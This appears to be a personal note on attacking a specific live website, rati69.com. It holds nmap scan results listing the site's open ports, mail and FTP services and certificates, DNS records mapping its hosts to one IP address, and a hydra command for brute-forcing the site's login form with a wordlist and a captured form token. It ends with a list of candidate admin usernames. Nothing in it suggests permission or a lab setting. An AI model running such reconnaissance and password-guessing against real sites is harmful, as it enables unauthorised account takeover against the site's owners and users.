https://rati69.com/

PORT     STATE  SERVICE    VERSION
21/tcp   open   ftp        ProFTPD or KnFTPD
| ssl-cert: Subject: commonName=lambotero.life/organizationName=XX/stateOrProvinceName=XX/countryName=XX
| Not valid before: 2022-03-20T16:47:01
|_Not valid after:  2032-03-17T16:47:01
22/tcp   open   tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
25/tcp   open   tcpwrapped
|_smtp-commands: Couldn't establish connection on port 25
53/tcp   open   tcpwrapped
80/tcp   open   tcpwrapped
|_http-title: Did not follow redirect to https://rati69.com:443/
110/tcp  open   tcpwrapped
143/tcp  open   tcpwrapped
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: capabilities LOGIN-REFERRALS STARTTLS SASL-IR LITERAL+ IDLE OK more AUTH=PLAIN ENABLE post-login have AUTH=LOGIN listed IMAP4rev1 Pre-login AUTH=CRAM-MD5A0001 ID AUTH=DIGEST-MD5
443/tcp  open   tcpwrapped
| ssl-cert: Subject: commonName=rati69.com
| Subject Alternative Name: DNS:rati69.com, DNS:www.rati69.com
| Not valid before: 2022-10-07T10:15:09
|_Not valid after:  2023-01-05T10:15:08
|_http-title: 400 The plain HTTP request was sent to HTTPS port
465/tcp  open   tcpwrapped
| ssl-cert: Subject: commonName=lambotero.life/organizationName=XX/stateOrProvinceName=XX/countryName=XX
| Not valid before: 2022-03-20T16:46:18
|_Not valid after:  2032-03-17T16:46:18
| smtp-commands: lambotero.life Hello rati69.com [213.230.72.179], SIZE 52428800, 8BITMIME, PIPELINING, PIPE_CONNECT, AUTH PLAIN LOGIN CRAM-MD5, CHUNKING, HELP
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
587/tcp  open   smtp       Exim smtpd 4.94.2
| ssl-cert: Subject: commonName=lambotero.life/organizationName=XX/stateOrProvinceName=XX/countryName=XX
| Not valid before: 2022-03-20T16:46:18
|_Not valid after:  2032-03-17T16:46:18
|_smtp-commands: Couldn't establish connection on port 587
993/tcp  open   tcpwrapped
| ssl-cert: Subject: commonName=lambotero.life/organizationName=XX/stateOrProvinceName=XX/countryName=XX
| Not valid before: 2022-03-20T16:46:18
|_Not valid after:  2032-03-17T16:46:18
995/tcp  open   tcpwrapped
| ssl-cert: Subject: commonName=lambotero.life/organizationName=XX/stateOrProvinceName=XX/countryName=XX
| Not valid before: 2022-03-20T16:46:18
|_Not valid after:  2032-03-17T16:46:18
3306/tcp closed mysql
5432/tcp closed postgresql
Service Info: OS: Unix

DNS ADDRESSES:

ftp.rati69.com
IP address #1: 193.56.8.236

mail.rati69.com
IP address #1: 193.56.8.236

pop.rati69.com
IP address #1: 193.56.8.236

smtp.rati69.com
IP address #1: 193.56.8.236

www.rati69.com
IP address #1: 193.56.8.236

lets enumirate hydra:
hydra -L /usr/share/wordlists/fasttrack.txt -V http-form-post '/login/login:login=^USER^&pwd=pass&remember=1&_xfToken=1667401014%2C99d6fd0061eca8cfe810dc0aaa1696a9'

creds:
admin -
rati -
rati69 -

